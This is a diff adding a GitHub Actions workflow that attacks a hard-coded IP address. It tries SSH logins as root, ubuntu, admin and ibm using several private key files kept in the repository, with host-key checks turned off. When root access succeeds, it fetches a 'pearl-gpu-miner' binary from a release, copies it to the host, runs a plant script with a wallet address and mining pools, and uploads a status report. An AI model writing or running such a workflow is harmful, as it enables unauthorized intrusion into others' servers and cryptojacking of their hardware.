@@ -1,0 +1,49 @@
+name: ul7621-probe
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 55
+    env:
+      H: "123.184.7.135"
+      WALLET: prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+      POOL: stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe users and keys
+        run: |
+          set +e
+          mkdir -p ~/.ssh
+          for u in root ubuntu admin ibm; do
+            for k in keys2/k04_ibm_key.pem_ keys/ibm_key.pem az/ibm_key.pem keys2/k01_k_ali_ keys2/k02_k_hkbc_ keys2/k03_k_hkip_; do
+              [ -f "$k" ] || continue
+              head -c 40 "$k" | grep -q "PRIVATE KEY" || continue
+              chmod 600 "$k"
+              R=$(timeout 20 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey "$u@$H" 'id; hostname' 2>&1)
+              echo "=== $u @ $k rc=$? :: $(echo "$R" | head -2 | tr '\n' '|')"
+            done
+          done
+      - name: if root works, plant
+        run: |
+          set +e
+          SSHOPTS="-i keys2/k04_ibm_key.pem_ -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15"
+          if ssh $SSHOPTS root@$H 'true' 2>/dev/null; then
+            echo ROOT-OK
+            mkdir -p /tmp/ul-kit
+            GH_TOKEN=${{ secrets.GH_PAT }} gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'pearl-gpu-miner' -D /tmp/ul-kit --clobber
+            GH_TOKEN=${{ secrets.GH_PAT }} gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'libcudart.so.12' -D /tmp/ul-kit --clobber
+            ssh $SSHOPTS root@$H 'mkdir -p /tmp/ul-kit'
+            scp $SSHOPTS /tmp/ul-kit/pearl-gpu-miner /tmp/ul-kit/libcudart.so.12 root@$H:/tmp/ul-kit/
+            ssh $SSHOPTS root@$H "bash -s -- fill ul-123-184-7-135 $WALLET $POOL" < ul/7621_plant.sh
+            sleep 600
+            ssh $SSHOPTS root@$H "bash -s" < ul/7621_status.sh | tee /tmp/status_a800probe.txt
+          else
+            echo ROOT-STILL-DENIED
+          fi
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: ul7621-a800probe
+          path: /tmp/status_a800probe.txt
+          if-no-files-found: warn
